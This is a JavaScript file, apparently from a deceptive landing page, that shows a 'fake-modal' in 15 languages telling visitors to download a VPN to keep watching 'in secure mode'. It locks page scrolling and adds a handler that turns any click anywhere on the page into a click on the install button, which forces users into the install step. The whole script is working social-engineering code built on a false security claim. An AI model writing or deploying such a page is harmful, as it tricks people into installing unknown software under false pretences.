document.body.style.overflow ="hidden";

(function () {
  const setViewportHeight = () => {
    const viewportHeight = window.visualViewport
      ? window.visualViewport.height
      : window.innerHeight;

    document.documentElement.style.setProperty(
      "--app-viewport-height",
      `${Math.round(viewportHeight)}px`
    );
  };

  setViewportHeight();
  window.addEventListener("resize", setViewportHeight);
  window.addEventListener("orientationchange", setViewportHeight);

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", setViewportHeight);
    window.visualViewport.addEventListener("scroll", setViewportHeight);
  }
})();

document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const modal = document.querySelector(".fake-modal");
  


    let totalSeconds = "60";
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

 const translations = {
  en: {
  modal_title_key: "Attention",
  modal_text_key: "Download a <strong>VPN</strong> to continue watching in secure mode.",
  scan_now_option: "Install",
},

fr: {
modal_title_key: "Attention",
modal_text_key: "Téléchargez un <strong>VPN</strong> pour continuer à regarder en mode sécurisé.",
scan_now_option: "Installer",
},

"pt-PT": {
modal_title_key: "Atenção",
modal_text_key: "Transfira uma <strong>VPN</strong> para continuar a ver em modo seguro.",
scan_now_option: "Instalar",
},

"pt-BR": {
modal_title_key: "Atenção",
modal_text_key: "Baixe uma <strong>VPN</strong> para continuar assistindo no modo seguro.",
scan_now_option: "Instalar",
},

es: {
modal_title_key: "Atención",
modal_text_key: "Descargue una <strong>VPN</strong> para seguir viendo en modo seguro.",
scan_now_option: "Instalar",
},

"es-419": {
modal_title_key: "Atención",
modal_text_key: "Descarga una <strong>VPN</strong> para seguir viendo en modo seguro.",
scan_now_option: "Instalar",
},

da: {
modal_title_key: "Advarsel",
modal_text_key: "Download en <strong>VPN</strong> for at fortsætte visningen i sikker tilstand.",
scan_now_option: "Installer",
},

ja: {
modal_title_key: "注意",
modal_text_key: "安全モードで視聴を続けるには、<strong>VPN</strong>をインストールしてください。",
scan_now_option: "インストール",
},

fil: {
modal_title_key: "Babala",
modal_text_key: "Mag-download ng <strong>VPN</strong> upang magpatuloy sa panonood sa secure na mode.",
scan_now_option: "I-install",
},

de: {
modal_title_key: "Achtung",
modal_text_key: "Laden Sie ein <strong>VPN</strong> herunter, um im sicheren Modus weiterzusehen.",
scan_now_option: "Installieren",
},

nb: {
modal_title_key: "Advarsel",
modal_text_key: "Last ned en <strong>VPN</strong> for å fortsette å se i sikker modus.",
scan_now_option: "Installer",
},

sv: {
modal_title_key: "Observera",
modal_text_key: "Ladda ner en <strong>VPN</strong> för att fortsätta titta i säkert läge.",
scan_now_option: "Installera",
},

it: {
modal_title_key: "Attenzione",
modal_text_key: "Scarica una <strong>VPN</strong> per continuare a guardare in modalità sicura.",
scan_now_option: "Installa",
},

nl: {
modal_title_key: "Let op",
modal_text_key: "Download een <strong>VPN</strong> om verder te kijken in de beveiligde modus.",
scan_now_option: "Installeren",
},

ro: {
modal_title_key: "Atenție",
modal_text_key: "Descarcă un <strong>VPN</strong> pentru a continua vizionarea în modul securizat.",
scan_now_option: "Instalează",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").innerHTML = t.modal_text_key || translations.en.modal_text_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;


document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    installBtn.click();
});




    if (bg) {
        requestAnimationFrame(() => {
            bg.classList.add("active");
        });
    }

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
